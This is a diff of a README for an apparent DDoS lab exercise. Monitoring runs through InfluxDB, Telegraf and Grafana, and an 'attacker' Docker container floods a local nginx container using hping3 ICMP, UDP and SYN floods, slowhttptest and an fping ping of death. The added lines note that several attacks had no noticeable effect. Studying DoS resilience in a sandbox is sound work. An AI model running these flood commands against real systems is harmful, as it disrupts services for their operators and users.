@@ -1,6 +1,7 @@
 # prjctr-16-ddos
 
 Create a token in influxdb for telegraf, add to telegraf config
+
 Create a token in influxdb for grafana, add to grafana config
 
 ```
@@ -17,11 +18,15 @@ docker compose up -d --build
 
 ### ICMP flood
 
+No noticeable effects
+
 ```
 docker exec -it attacker hping3 --flood --icmp nginx -p 8080
 ```
 
 ### UDP flood
+
+No noticeable effects
 
 ```
 docker exec -it attacker hping3 --flood --rand-source --udp -p 8080 nginx
@@ -45,11 +50,15 @@ docker exec -it attacker slowhttptest -c 1050 -H -g -o slowhttp -i 10 -r 200 -t 
 
 ### SYN flood
 
+No noticeable effects
+
 ```
 docker exec -it attacker hping3 -S --flood -V -p 8080 nginx
 ```
 
 ### Ping of death
+
+No noticeable effects
 
 ```
 docker exec -it attacker fping -b 65488 -c 10000 -p 10 nginx
